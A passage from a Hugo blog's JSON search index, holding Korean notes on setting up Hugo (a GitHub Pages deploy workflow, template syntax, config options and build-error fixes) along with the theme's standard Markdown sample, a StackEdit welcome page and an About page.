\u0026#34;[[ -f package-lock.json || -f npm-shrinkwrap.json ]] \u0026amp;\u0026amp; npm ci || true\u0026#34;\r- name: Build with Hugo\renv:\r# For maximum backward compatibility with Hugo modules\rHUGO_ENVIRONMENT: production\rHUGO_ENV: production\rrun: |\rhugo --minify --config config.yml\r- name: Upload artifact\ruses: actions/upload-pages-artifact@v1\rwith:\rpath: ./public\r# Deployment job\rdeploy:\renvironment:\rname: github-pages\rurl: ${{ steps.deployment.outputs.page_url }}\rruns-on: ubuntu-latest\rneeds: build\rsteps:\r- name: Deploy to GitHub Pages\rid: deployment\ruses: actions/deploy-pages@v2 문법 Hugo 문법 hugo는 html 안에 {{ }} 형태로 hugo용 구문을 넣을 수 있다. {{ }}안에 --, %%, \u0026lt;\u0026gt; 를 넣어 용도에 따라 다양한 변형이 있을 수 있다. {{- }}, {{ -}}, {{- -}} 를 사용하면 앞/뒤쪽의 줄바꿈 및 빈 여백을 모두 제거해 준다. 변수 선언 변수는 site, page 에 따라 다르게 선언 할 수 있다. config.yml 파일에 선언하면 site 단위로 선언되며, 전역 변수처럼 모든 page에서 참조 가능하다. .Params 은 page 변수를 참조하며, site.Params 은 site 변수를 참조하는 방식이다. page 변수는 hugo new 를 사용하여 만든 각 페이지(.md파일) 최상단에 작성된 메타데이터(+++ 혹은 \u0026mdash; 로 감싸진 구역의 데이터)를 의미한다. {{- $isHidden := Params.cover.hidden | default site.Params.cover.hiddenInSingle | default site.Params.cover.hidden }} : page 변수로 \u0026lsquo;isHidden\u0026rsquo; 를 선언하는 예시 조건문 {{- if (.Param \u0026quot;ShowToc\u0026quot;) }} : page변수에서 ShotToc가 있는지 체크 RelPermalink vs Permalink\nYOUR_CUSTOM_PATH.RelPermalink : baseurl을 / 로 처리한 링크 (/YOUR_CUSTOM_PATAH) YOUR_CUSTOM_PATH.Permalink : baseurl을 앞에 붙인 링크 (https://localhost:1313/YOUR_CUSTOM_PATAH) 파일 import\n페이지 내부에서 다른 파일을 import 해오려면 {{template 파일명}} 혹은 {{partial 파일명}} 을 사용하면 된다. 이때 인자로 dictionary 데이터를 전달 할 수 있다. {{ template 파일명 dict (\u0026quot;Pages\u0026quot; .Site.RegularPages )}} 와 같이 사용하면 호출된다. 이런 방식으로 subpage들을 recursive하게 참조할 수 있다. {{ define \u0026#34;sample\u0026#34; }}\r...\r{{- $subSections := where .Site.Sections \u0026#34;Parent\u0026#34; .Sections }}\r{{ template sample dict (\u0026#34;Sections\u0026#34; $subSections) }}\r...\r{{ end }} define\n{{- define 이름 -}} {{ end }} 을 세트로 사용하여 사이에 있는 모든 구문을 \u0026ldquo;이름\u0026rdquo; 으로 정의한다. template이나 partial을 통해 define 된 구문을 호출할 수 있다. : {{ tempalte 이름 }} 반복문\n{{ range $itr := LIST}} {{ end }} : LIST 안의 내용을 하나씩 itr 에 담아서 반복한다. 이때, range 문 안에서는 \u0026lsquo;.\u0026rsquo; 문자는 $itr 을 의미하게 되므로, 주의한다. 구조 Scope . 혹은 $. 으로 변수를 호출하면 context 에 선언된 변수를 호출하는 것이다. context는 page를 생성할 때 전달해 줄 수 있다. {{ template FILE_NAME CONTEXT_NAME CONTEXT_VALUE}} 와 같이 사용하면 해당 파일 안에서 .은 CONTEXT_VALUE를 의미하게 된다. 여러 데이터를 주고 싶다면 dict() 함수를 사용해서 dictionary 형태를 전달할 수도 있다. {{ template FILE_NAME dict(\u0026quot;v1\u0026quot; v1 \u0026quot;v2\u0026quot; v2)}} Site \u0026amp; Page \u0026amp; Section Site는 전체 프로젝트, Page는 내용물을 담고 있는 파일, Section은 폴더(디렉터리) 로 이해하면 편하다. 각각 변수 scope를 갖고 있어서 .Site.변수이름, .Page.변수이름, Section.변수이름 으로 변수를 참조 및 선언할 수 있다. 하지만, config파일에서 선언하지 않는 한, 다른 파일에서 선언한 변수는 같은 page라도 참조가 되지 않는다. (필요시 전달할 수 있는 방법은 있다) Site (https://gohugo.io/variables/site/) Page (https://gohugo.io/variables/page/) Section (https://gohugo.io/content-management/sections/) Section이 되기위한 조건으로는 1) content 폴더의 직속 디렉터리 이거나, 2) 안에 _index.md 파일을 지녀야 한다. _index.md 파일을 지닌 디렉터리는 중간 가지 역할을 하고, index.md 파일을 지닌 디렉터리는 leaf node 역할을 하며, index.md 파일과 동일한 디렉터리에 들어있는 파일들은 각각의 페이지가 생성되지 않는다. 이미지 이미지는 /static 폴더에 넣으면 컴파일 시 /public 폴더로 이동된다. 즉, /static/image/sample.png 파일은 컴파일시 /public/image/sample.png 로 이동되며, ![이미지 설명](/image/sample.png) 구문으로 markdown에서 이미지를 참조할 수 있다. 단, 이미지 경로에 특수문자나 띄어쓰기가 없어야 함에 주의한다. config config.yml, config.toml 등 설정 파일을 통해 hugo 동작시 옵션들을 세팅할 수 있다. baseURL: 최상위 root 경로를 설정하는 값이다. hugo server --baseURL \u0026quot;/\u0026quot; 로 테스트 할 때 baseURL만 따로 세팅할 수도 있다. 오류 해결 배포 페이지 CSS 동작 오류 hugo server로 로컬에서 동작시키면 css가 정상적으로 나오지만, 배포한 github page에서 css가 제대로 동작하지 않는다면 stylesheet를 선언하는 부분(보통 theme/선택한_테마/layouts/partials/head.html에 있음) 에서 baseurl이 정상적으로 설정되었는지 확인한다. stylesheet는 href=\u0026quot;{{ $stylesheet.RelPermalink }}\u0026quot; 와 같이 정상적으로 설정했는지 확인한다. (url을 직접 string으로 입력하기보다 url을 세팅해주는 함수를 사용하는것을 권장) Failed to find a valid digest in the \u0026lsquo;integrity\u0026rsquo; attribute for resource hugo에서 제공하는 .Data.Integrity 기능을 사용하여 html tag에 integrity 속성을 부여했을 경우 발생한다. config파일에서 minify 설정을 해 놓으면, 파일의 불필요한 줄바꿈, 공백을 제거하는데, minify 하기 전 값을 sha256으로 인코딩 하여, 결과가 틀려지는 것이다. # minify 설정\rminify:\rdisableXML: true\rminifyOutput: true 위와 같은 설정이 config파일에 있다면, fingerprint를 사용하기 전에 minify를 먼저 수행하라. {{- $stylesheet := $stylesheet | minify | fingerprint \u0026quot;sha256\u0026quot;}}. fingerprint의 default값은 sha256이므로, sha256은 제거해도 무관 github page 자동화 오류 fatal: remote error: upload-pack: not our ref 7821df1a10579b4a62917f0f07d3a5c482e872f6 github actions/checkout@v3 에서 submodule의 특정 commit으로 checkout 이 안되는 현상이다. render of \u0026quot;page\u0026quot; failed: \u0026quot;C:\\HugoBlog\\themes\\hugo-PaperMod\\layouts\\_default\\baseof.html:5:8\u0026quot;: execute of template failed: template: _default/single.html:5:8: executing \u0026quot;_default/single.html\u0026quot; at \u0026lt;partial \u0026quot;head.html\u0026quot; .\u0026gt;: error calling partial: execute of template failed: template: partials/templates/opengraph.html:5:14: executing \u0026quot;partials/templates/opengraph.html\u0026quot; at \u0026lt;.Params.cover.image\u0026gt;: can't evaluate field image in type string 빌드 했을 때 위와같은 오류가 발생 한다면, golang과 hugo 버전 차이에 따라 페이지가 파싱이 제대로 되지 않는 경우이다. hugo 문법에 따라 페이지를 수정하거나 golang, hugo 버전을 최신으로 업데이트 해 본다. image url 오류 config.yml 파일에서 baseURL 을 설정하면 /static 디렉터리에 들어간 이미지들을 post 디렉터리의 markdown 으로 작성한 이미지 link가 정상적으로 세팅되지 않는다. 실제 코드 예시 : ![IMAGE1](/POST1/image1.png) static 디렉터리 안의 이미지 예시 : /static/POST1/image1.png baseUrl 예시 : http://mypage.com 빌드시 실제 image 파일 경로 : http://mypage.com/POST1/image1.png 빌드후 page에서 세팅된 image url : /POST1/image1.png 이를 해결하려면 config.yml 에 canonifyurls: true 세팅을 하나 더 추가 해 준다. 그러면 빌드시 page 에서 세팅된 image url 앞에 baseURL이 추가되어 경로 미스매칭이 해결된다. ","permalink":"https://aswinblue.github.io/Blog/post/hugo/hugo_dev/","summary":"Hugo를 이용해 블로그 만들기 Git과 markdown을 이용하여 git을 블로그처럼 이용하는 사람들이 있다는 것을 알았다.\n게다가 UI를 보기 좋게 꾸며줄 수 있는 툴들도 찾았는데, 그 중 Hugo를 사용해 보았다.\nHugo는 Go 언어로 짜여져 있어 apt-get으로도 설치가 가능하고, 소스 코드를 받아 빌드하여 쓸 수도 있다.\n내 컴퓨터에는 Go가 이미 설치되 있던 터라 apt-get으로 hugo를 받아서 사용해 보았다.\n설치는 정상적으로 되었고, 처음에는 잘 동작하는 듯 했는데, theme을 적용하니 ERROR들이 뜨기 시작했다.\n인터넷 검색을 아무리 해 봐도 해결책이 보이지 않고, 해당 git에 issue를 날려보기도 했는데 응답이 없어서 혼자 이것저것 뒤져 보았다.","title":"Hugo 환경세팅"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 `` The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 ``\nParagraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\n`` Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\n``\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Inline Markdown In Table italics bold strikethrough code Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block with Hugo\u0026rsquo;s internal highlight shortcode \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Item First Sub-item Second Sub-item Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nWelcome to StackEdit! Hi! I\u0026rsquo;m your first Markdown file in StackEdit. If you want to learn about StackEdit, you can read me. If you want to play with Markdown, you can edit me. Once you have finished with me, you can create new files by opening the file explorer on the left corner of the navigation bar.\nFiles StackEdit stores your files in your browser, which means all your files are automatically saved locally and are accessible offline!\nCreate files and folders The file explorer is accessible using the button in left corner of the navigation bar. You can create a new file by clicking the New file button in the file explorer. You can also create folders by clicking the New folder button.\nSwitch to another file All your files and folders are presented as a tree in the file explorer. You can switch from one to another by clicking a file in the tree.\nRename a file You can rename the current file by clicking the file name in the navigation bar or by clicking the Rename button in the file explorer.\nDelete a file You can delete the current file by clicking the Remove button in the file explorer. The file will be moved into the Trash folder and automatically deleted after 7 days of inactivity.\nExport a file You can export the current file by clicking Export to disk in the menu. You can choose to export the file as plain Markdown, as HTML using a Handlebars template or as a PDF.\nSynchronization Synchronization is one of the biggest features of StackEdit. It enables you to synchronize any file in your workspace with other files stored in your Google Drive, your Dropbox and your GitHub accounts. This allows you to keep writing on other devices, collaborate with people you share the file with, integrate easily into your workflow\u0026hellip; The synchronization mechanism takes place every minute in the background, downloading, merging, and uploading file modifications.\nThere are two types of synchronization and they can complement each other:\nThe workspace synchronization will sync all your files, folders and settings automatically. This will allow you to fetch your workspace on any other device.\nTo start syncing your workspace, just sign in with Google in the menu.\nThe file synchronization will keep one file of the workspace synced with one or multiple files in Google Drive, Dropbox or GitHub. Before starting to sync files, you must link an account in the Synchronize sub-menu.\nOpen a file You can open a file from Google Drive, Dropbox or GitHub by opening the Synchronize sub-menu and clicking Open from. Once opened in the workspace, any modification in the file will be automatically synced.\nSave a file You can save any file of the workspace to Google Drive, Dropbox or GitHub by opening the Synchronize sub-menu and clicking Save on. Even if a file in the workspace is already synced, you can save it to another location. StackEdit can sync one file with multiple locations and accounts.\nSynchronize a file Once your file is linked to a synchronized location, StackEdit will periodically synchronize it by downloading/uploading any modification. A merge will be performed if necessary and conflicts will be resolved.\nIf you just have modified your file and you want to force syncing, click the Synchronize now button in the navigation bar.\nNote: The Synchronize now button is disabled if you have no file to synchronize.\nManage file synchronization Since one file can be synced with multiple locations, you can list and manage synchronized locations by clicking File synchronization in the Synchronize sub-menu. This allows you to list and remove synchronized locations that are linked to your file.\nPublication Publishing in StackEdit makes it simple for you to publish online your files. Once you\u0026rsquo;re happy with a file, you can publish it to different hosting platforms like Blogger, Dropbox, Gist, GitHub, Google Drive, WordPress and Zendesk. With Handlebars templates, you have full control over what you export.\nBefore starting to publish, you must link an account in the Publish sub-menu.\nPublish a File You can publish your file by opening the Publish sub-menu and by clicking Publish to. For some locations, you can choose between the following formats:\nMarkdown: publish the Markdown text on a website that can interpret it (GitHub for instance), HTML: publish the file converted to HTML via a Handlebars template (on a blog for example). Update a publication After publishing, StackEdit keeps your file linked to that publication which makes it easy for you to re-publish it. Once you have modified your file and you want to update your publication, click on the Publish now button in the navigation bar.\nNote: The Publish now button is disabled if your file has not been published yet.\nManage file publication Since one file can be published to multiple locations, you can list and manage publish locations by clicking File publication in the Publish sub-menu. This allows you to list and remove publication locations that are linked to your file.\nMarkdown extensions StackEdit extends the standard Markdown syntax by adding extra Markdown extensions, providing you with some nice features.\nProTip: You can disable any Markdown extension in the File properties dialog.\nSmartyPants SmartyPants converts ASCII punctuation characters into \u0026ldquo;smart\u0026rdquo; typographic punctuation HTML entities. For example:\nASCII HTML Single backticks 'Isn't this fun?' \u0026lsquo;Isn\u0026rsquo;t this fun?\u0026rsquo; Quotes \u0026quot;Isn't this fun?\u0026quot; \u0026ldquo;Isn\u0026rsquo;t this fun?\u0026rdquo; Dashes -- is en-dash, --- is em-dash \u0026ndash; is en-dash, \u0026mdash; is em-dash KaTeX You can render LaTeX mathematical expressions using KaTeX:\nThe Gamma function satisfying $\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$ is via the Euler integral\n$$ \\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt,. $$\nYou can find more information about LaTeX mathematical expressions here.\nUML diagrams You can render UML diagrams using Mermaid. For example, this will produce a sequence diagram:\nsequenceDiagram\rAlice -\u0026gt;\u0026gt; Bob: Hello Bob, how are you?\rBob--\u0026gt;\u0026gt;John: How about you John?\rBob--x Alice: I am good thanks!\rBob-x John: I am good thanks!\rNote right of John: Bob thinks a long\u0026lt;br/\u0026gt;long time, so long\u0026lt;br/\u0026gt;that the text does\u0026lt;br/\u0026gt;not fit on a row.\rBob--\u0026gt;Alice: Checking with John...\rAlice-\u0026gt;John: Yes... John, how are you? And this will produce a flow chart:\ngraph LR\rA[Square Rect] -- Link text --\u0026gt; B((Circle))\rA --\u0026gt; C(Round Rect)\rB --\u0026gt; D{Rhombus}\rC --\u0026gt; D The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://aswinblue.github.io/Blog/post/hugo/sample/","summary":"\u003cp\u003eThis article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\u003c/p\u003e","title":"Markdown Syntax Guide"},{"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\nhttps://github.com/russross/blackfriday https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub.\n","permalink":"https://aswinblue.github.io/Blog/about/","summary":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\nhttps://github.com/russross/blackfriday https://github.","title":"About"}]